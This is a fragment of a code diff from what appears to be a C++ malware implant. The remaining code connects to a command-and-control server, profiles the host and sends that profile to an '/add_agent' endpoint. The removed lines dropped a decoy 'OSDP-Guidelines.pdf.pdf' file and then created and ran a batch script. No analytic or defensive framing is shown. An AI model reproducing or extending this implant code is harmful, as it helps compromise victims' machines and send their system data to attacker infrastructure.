@@ -21,15 +21,6 @@ int main() {
         if (ReachIntranet) { 
             std::wstring C2 = C2Conn(URLS); 
             if (!C2.empty()) {
-                std::string pdfPath = GetCWD() + "OSDP-Guidelines.pdf.pdf"; 
-                std::ofstream output(pdfPath, std::ios::binary); 
-                output.write(reinterpret_cast<char*>(OSDP_Guidelines_pdf), OSDP_Guidelines_pdf_len); 
-                output.close(); 
-
-                std::string BatPath = CreateBat(pdfPath); 
-                Sleep(1); 
-                ExecBat(BatPath);
-
                 std::wstring PC2 = C2 + L"/add_agent";
                 nlohmann::json JsonProfile = Profiler(); 
                 std::string response = SendProfile(PC2, JsonProfile);
